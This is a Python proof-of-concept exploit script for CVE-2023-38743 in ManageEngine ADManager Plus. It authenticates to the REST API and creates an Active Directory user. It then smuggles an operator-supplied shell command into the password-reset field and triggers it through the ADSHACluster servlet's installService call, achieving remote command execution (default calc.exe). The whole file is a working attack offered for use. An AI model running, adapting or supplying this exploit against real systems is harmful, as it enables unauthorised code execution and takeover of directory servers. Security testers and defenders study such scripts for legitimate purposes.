import argparse, requests
import base64
import urllib3
import urllib.parse

urllib3.disable_warnings()


class exploit:
    def __init__(self, url, username, password, domain, cmd):
        self.username = username
        self.password = password
        if url.endswith("/"):
                self.url = url[:-1]
        else:
                self.url = url
        self.domain = domain
        self.cmd = cmd
        self.exploit()
        
    def getAuthToken(self):
        r = requests.get(f"{self.url}/RestAPI/APIAuthToken?loginName={self.username}&password={self.password}&domainName=ADManager%20Plus%20Authentication", verify=False)
        self.authtoken = r.json().get("AuthTicket")
        if self.authtoken:
            print("AuthToken: ", self.authtoken)
        else:
            raise Exception("Login false")

    def createUser(self):
        r=requests.post(
            f"{self.url}/RestAPI/CreateUser",
            data=f'domainName={self.domain}&AuthToken={self.authtoken}&PRODUCT_NAME=AD+Management&inputFormat=[%7b"givenName"%3a"poc","password"%3a"Admin123456"%7d]',
            headers={"Content-Type":"application/x-www-form-urlencoded"}, verify=False)
        self.cmd = f"& {self.cmd} & Admin123456"
        r=requests.post(
            f"{self.url}/RestAPI/ResetPwd",
            data=f'domainName={self.domain}&AuthToken={self.authtoken}&PRODUCT_NAME=AD+Management&pwd={urllib.parse.quote_plus(self.cmd)}&inputFormat=[%7b"sAMAccountName":"poc"%7d]',
            headers={"Content-Type":"application/x-www-form-urlencoded"}, verify=False)

        print(f"Created AD user: {self.domain}\\poc")


    def exploit(self):
        self.getAuthToken()
        self.createUser()
        cert = f'\x7b"TECHNICIAN_NAME":"{self.username}","TECHNICIAN_PASSWORD":"{self.password}"\x7d'
        cert = base64.b64encode(cert.encode()).decode()
        print("Run command: ", self.cmd)
        r=requests.post(
            f"{self.url}/servlet/ADSHACluster",
            data=f'MTCALL=installService&credential={cert}&DOMAIN={self.domain}&USER_NAME=cG9j&PASSWORD={base64.b64encode(self.cmd.encode()).decode()}=&admpcsrf=057b1a77-b1fc-4642-a47e-f885a2dee1c9',
            cookies={"adapcsrf":"057b1a77-b1fc-4642-a47e-f885a2dee1c9"},
            headers={"Content-Type":"application/x-www-form-urlencoded"}, verify=False)
        print('RESPONSE: ', r.text)

class customParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write('error: %s\n' % message)
        self.print_help()
        sys.exit(2)

if __name__ == '__main__':
    parser = customParser(prog='CVE-2023-38743 Exploit', description='Python 3 script to CVE-2023-38743 exploit')
    parser.add_argument('-url', help='Single URL target', default='http://vmex.local:8080/')
    parser.add_argument('-u', '--user', help='Admin user name', default='admin')
    parser.add_argument('-p', '--password', help='Admin password', default='admin')
    parser.add_argument('-d', '--domain', help='AD Domain', default='vmex.local')
    parser.add_argument('-c', '--cmd', help='Command to execute', default='calc.exe')
    args = parser.parse_args()

    exploit(
        url=args.url,
        username=args.user,
        password=args.password,
        domain=args.domain,
        cmd=args.cmd)
    
